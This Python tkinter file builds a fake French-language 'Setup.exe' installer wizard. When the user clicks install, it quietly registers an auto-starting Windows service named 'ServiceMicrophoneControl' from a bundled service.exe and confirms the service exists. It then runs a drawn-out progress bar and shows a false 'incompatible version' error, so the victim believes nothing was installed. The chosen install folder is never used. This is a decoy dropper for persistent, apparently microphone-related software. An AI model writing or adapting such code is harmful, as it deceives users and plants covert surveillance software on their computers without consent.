from tkinter import *
from tkinter import ttk
from tkinter import filedialog
import threading
import win32serviceutil
import time
import tkinter
from tkinter.messagebox import showerror
import subprocess
import os

root = Tk()
root.title('Setup.exe')
root.iconbitmap("download.ico")
root.geometry("600x400")



def progress():
    global button2
    # progress bar
    button2.configure(text='Terminé', state=tkinter.DISABLED)
    progress = ttk.Progressbar(root, orient=HORIZONTAL, mode='determinate', length=400)
    progress.pack(pady=100)
    progress['value'] += 0.5

    # creation du serivce
    if __name__ == '__main__':
        os.popen('service.exe --startup auto install')

    # verifier que le service a ete cree
    try:
        win32serviceutil.QueryServiceStatus('ServiceMicrophoneControl')
    except:
        print('service doesnt exists')
        ex = 0
    else:
        ex = 1
        print("service do exsits")
    if ex == 1:
        # incrementation de la progress bar
        for i in range(50):
            progress['value'] += 1
            root.update_idletasks()
            time.sleep(2)

        if progress['value'] == 50.5:
            button2['state'] = tkinter.NORMAL
            Tk().withdraw()
            showerror(title="Error",
                      message="Erreur, Les fichiers d'installation sont incompatible avec cette version systeme."
                              " Essayez d'obtenir une nouvelle version du programme", command=exit())


def setup():
    label2.destroy()
    lbl1.forget()
    button1.destroy()
    button3.destroy()
    timer = threading.Timer(0.5, progress)
    timer.start()


def close():
    exit()


def Dir():

    global folder_path
    filename = filedialog.askdirectory()
    folder_path.set(filename)
    print(filename)


label1 = Label(root, text="Bienvenue dans l'assistant de l'installation", font=('Verdana', 15, 'bold'), fg='#fdb827')
label1.pack()
label2 = Label(root, text="Ce programme va installer un logiciel sur votre ordinateur", font=3, fg='black')
label2.pack()
folder_path = StringVar()
lbl1 = Entry(root, textvariable=folder_path, width=50)
lbl1.pack(padx=100,pady=150)
button3 = Button(root, text="Browse", command=Dir)
button3.place(x=450, y=200)
button1 = Button(root, text="Installer", command=setup)
button1.place(x=450, y=300)
button2 = Button(root, text="Annuler", command=close)
button2.place(x=450, y=330)

root.mainloop()
